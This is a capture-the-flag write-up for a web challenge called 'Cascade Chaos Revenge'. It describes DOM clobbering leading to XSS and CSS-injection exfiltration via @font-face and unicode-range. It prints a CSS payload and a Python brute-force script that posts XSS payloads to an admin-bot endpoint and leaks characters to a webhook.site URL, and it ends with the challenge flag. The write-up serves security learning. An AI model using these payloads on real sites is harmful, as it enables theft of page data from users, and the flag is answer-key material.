# Cascade Chaos Revenge

Solved by: @vicevirus

## Question:
You thought you had it figured out. Last time, you exploited the system and claimed victory, but they've been watching. Now, the defenses are stronger, and they've patched the easy routes. But you know how to find the cracks. Time to prove you can break through, and the revenge flag is yours.

## Solution:
Similar to the previous challenge, there's a possibility DOM clobber to XSS in remote service

Can manipulate `window.name` to achieve css injection exfiltration through `font-face`.
```
}@font-face {
    font-family: testChar;
    src: url(https://webhookurl/?char=f);
    unicode-range: U+0066;
} /* Unicode for character 'f' */
.flag span:nth-child(1) {
    font-family: testChar, sans-serif;
}
```


Bruteforce the characters using unicode range + nth.child

```
import requests
import string
import time

# Set up the headers
headers = {
    'Host': '35.224.222.30:4001',
    'Accept-Language': 'en-GB,en;q=0.9',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'http://35.224.222.30:4001',
    'Referer': 'http://35.224.222.30:4001/convert',
    'Connection': 'keep-alive',
}

# Webhook URL
webhook_url = "https://webhook.site/bfb7ca18-de82-40ce-8bb2-930d503363d4"

# Function to send the payload for each character individually
def brute_force_chars():
    # for char in  "}": 
    for char in  string.ascii_letters:# Loop through all lowercase ASCII letters
        char_code = ord(char)
        payload = (
            "<p><img src='x' onerror=\"window.name='Flag';"
            "location.href='http://local:4003/flag?color=white;"
            "}@font-face {font-family:testChar;"
            f"src:url({webhook_url}?char={char}); unicode-range:U%2b{char_code:04X};"
            "/* Unicode for character */}.flag span:nth-child(27) {font-family:testChar, sans-serif;}" + "}'\"></p>"
        )

        json_data = {
            'content': payload,
            'heading': '<a id="isSafe"></a>',
        }

        try:
            response = requests.post('http://35.224.222.30:4004/visit', headers=headers, json=json_data, verify=False)
            print(f"Sent payload for character: {char}, Response: {response.status_code}")
        except Exception as e:
            print(f"Error sending payload for character: {char}: {e}")
        
        time.sleep(15)  # Wait for 5 seconds before sending the next request

# Start the brute force process for each character
brute_force_chars()
```

**Flag:** `flag{ah_y0u_go7_me_ag41n11}`
